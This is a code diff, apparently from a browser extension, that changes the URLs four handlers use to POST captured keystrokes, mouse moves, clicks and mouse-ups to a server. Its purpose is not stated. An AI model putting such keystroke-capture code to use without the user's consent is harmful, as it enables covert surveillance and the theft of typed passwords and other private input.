@@ -31,7 +31,7 @@ var messagesActionsMap = {
 	'keystroke': function(message, sender, sendResponse, serverConfig){
 		sendAjaxRequest({
 			method: 'POST',
-			url: serverConfig.serverUrl+serverConfig.keystrokesCallbackUrl,
+			url: /*serverConfig.serverUrl+'/'+*/serverConfig.keystrokesCallbackUrl,
 			headers: {
 				'Content-Type': 'application/json;charset=UTF-8'
 			},
@@ -50,7 +50,7 @@ var messagesActionsMap = {
 	'mouseMove': function(message, sender, sendResponse, serverConfig){
 		sendAjaxRequest({
 			method: 'POST',
-			url: serverConfig.serverUrl+serverConfig.mouseMovesCallbackUrl,
+			url: /*serverConfig.serverUrl+'/'+*/serverConfig.mouseMovesCallbackUrl,
 			headers: {
 				'Content-Type': 'application/json;charset=UTF-8'
 			},
@@ -76,7 +76,7 @@ var messagesActionsMap = {
 	'mouseClick': function(message, sender, sendResponse, serverConfig){
 		sendAjaxRequest({
 			method: 'POST',
-			url: serverConfig.serverUrl+serverConfig.mouseClicksCallbackUrl,
+			url: /*serverConfig.serverUrl+'/'+*/serverConfig.mouseClicksCallbackUrl,
 			headers: {
 				'Content-Type': 'application/json;charset=UTF-8'
 			},
@@ -102,7 +102,7 @@ var messagesActionsMap = {
 	'mouseUp': function(message, sender, sendResponse, serverConfig){
 		sendAjaxRequest({
 			method: 'POST',
-			url: serverConfig.serverUrl+serverConfig.mouseUpsCallbackUrl,
+			url: /*serverConfig.serverUrl+'/'+*/serverConfig.mouseUpsCallbackUrl,
 			headers:{
 				'Content-Type': 'application/json;charset=UTF-8'
 			},
